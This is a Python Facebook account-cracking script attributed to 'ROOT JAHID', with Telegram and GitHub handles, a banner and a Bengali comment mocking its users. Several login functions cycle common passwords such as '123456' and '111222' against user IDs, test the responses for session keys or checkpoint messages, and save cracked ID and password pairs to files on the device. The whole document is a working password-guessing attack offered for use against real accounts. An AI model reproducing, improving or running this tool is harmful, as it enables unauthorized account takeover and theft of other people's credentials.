# SCRIPT GIFT BY ROOT JAHID
# https://t.me/ROOTJAHIDX
# কি আর বলবো যত সব বোকাচোদা পোলাপান Script Encrypted করতে পারেনা আবার টুল চালায়😂
...
os.system('espeak -a 300 "well,come to,Root Jahid tools"')
logo = f"""
\033[0;92m
    ░█████    ░███    ░██     ░██ ░██████░███████   
      ░██    ░██░██   ░██     ░██   ░██  ░██   ░██  
...
\33[38;5;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\33[38;5;160m[\033[1;97m✔️\33[38;5;160m] \033[1;97mTELEGRAM   \33[38;5;160m▶  \033[1;97m ROOT JAHID
\33[38;5;160m[\033[1;97m✔️\33[38;5;160m] \033[1;97mGITHUB    \33[38;5;160m▶  \033[1;97mROOT JAHID XPLOIT
    ...
    try:
        ...
        for pw in ["123456","1234567","12345678","123456789","111222"]:
            ...
            if "session_key" in rp:            	
                ...
                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mROOT JAHID\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
                open("/sdcard/ROOT JAHID-M1-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            else:continue
        loop+=1
...
def login2(uid):
    ...
    Session=requests.session()
    try:
        sys.stdout.write(f'\r\r\33[38;5;37m[\x1b[38;5;46mROOT JAHID\33[38;5;37m-\x1b[38;5;46mB2\33[38;5;37m]\033[1;97m-\33[38;5;37m[\033[1;97m{loop}\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46mOK\33[38;5;160m/\x1b[38;5;208mCP\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46m{len(oks)}\33[38;5;160m/\x1b[38;5;208m{len(cps)}\33[38;5;37m]')
        sys.stdout.flush()
        ua = random.choice(ugen)
        ua = windows()
        for pw in ["123456","1234567","12345678","123456789","111222"]:
            ...
            rp = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
            if "session_key" in rp:            	
                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mROOT JAHIDm\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
                open("/sdcard/ROOT JAHID-M1-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                cps.append(uid)
                break
            elif "www.facebook.com" in rp['error']['message']:
...
def login3(uid):
    ...
    try:
        ...
        for pw in ["123456","1234567","12345678","123456789","111222"]:
            ...
            if "session_key" in rp:            	
                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mROOT JAHID\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
                open("/sdcard/ROOT JAHID-M2-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                cps.append(uid)
                break
            elif "www.facebook.com" in rp['error']['message']:
                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mROOT JAHID\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
...
def login4(uid):
    ...
    try:
        ...
        for pw in ["123456","1234567","12345678","123456789","111222"]:
            ...
            if "session_key" in rp:            	
                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mROOT JAHID\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
                open("/sdcard/ROOT JAHID-M3-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                cps.append(uid)
                break
            elif "www.facebook.com" in rp['error']['message']:
                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mROOT JAHID\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
